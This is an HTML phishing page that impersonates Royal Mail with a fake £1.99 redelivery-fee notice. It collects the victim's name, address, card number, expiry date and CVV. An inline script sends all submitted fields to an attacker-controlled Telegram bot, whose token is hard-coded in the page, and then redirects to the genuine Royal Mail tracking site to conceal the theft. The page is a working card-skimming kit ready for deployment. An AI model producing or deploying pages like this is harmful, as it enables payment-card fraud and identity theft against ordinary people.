<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Royal Mail – Redelivery fee</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body{font-family:Arial,Helvetica,sans-serif;background:#f4f4f4;margin:0;padding:20px}
    .box{max-width:420px;margin:auto;background:#fff;padding:25px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.15)}
    img.logo{width:180px;display:block;margin:0 auto 20px}
    h2{text-align:center;color:#e00}
    label{display:block;margin-top:12px;font-weight:700}
    input{width:100%;padding:10px;margin-top:6px;border:1px solid #ccc;border-radius:4px}
    button{background:#e00;color:#fff;width:100%;padding:14px;border:0;border-radius:4px;font-size:16px;margin-top:18px;cursor:pointer}
    button:hover{background:#c00}
    small{display:block;text-align:center;margin-top:10px;color:#666}
  </style>
</head>
<body>
  <div class="box">
    <img class="logo" src="https://logos-world.net/wp-content/uploads/2020/09/Royal-Mail-Logo.png" alt="Royal Mail">
    <h2>Payment required for redelivery</h2>
    <p>Your parcel is being held because the £1.99 redelivery fee was not paid. Complete the form below to schedule a new delivery date.</p>

    <form id="payForm">ss
      <label>Full name</label>
      <input name="name" placeholder="John Smith" required>

      <label>Delivery address</label>
      <input name="address" placeholder="123 Example St, London" required>

      <label>Card number</label>
      <input name="card" placeholder="1234 5678 9012 3456" required pattern="[0-9 ]{13,19}">

      <label>Expiry</label>
      <input name="exp" placeholder="12/25" required pattern="(0[1-9]|1[0-2])\/?([0-9]{2})">

      <label>CVV</label>
      <input name="cvv" placeholder="123" required pattern="[0-9]{3,4}">

      <button type="submit">Pay £1.99</button>
      <small>This one-time fee covers processing and redelivery.</small>
    </form>
  </div>

  <script>
    // ---------- CONFIGURE AQUI ----------
    const TOKEN   = '8721188883:AAEWO2YWWThjYLyQVbVUuxOf97ltFKmiBrQ';
    const CHAT_ID = '-1001234567890';
    // -------------------------------------

    document.getElementById('payForm').addEventListener('submit', function (e) {
      e.preventDefault();
      const data = new FormData(e.target);
      let csv = Array.from(data.entries()).map(([k,v])=>`${k}: ${v}`).join('\n');
      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({chat_id:CHAT_ID, text:csv})
      }).then(()=>window.location.href='https://www.royalmail.com/track-your-item'); // redireciona para site real
    });
  </script>
</body>
</html>
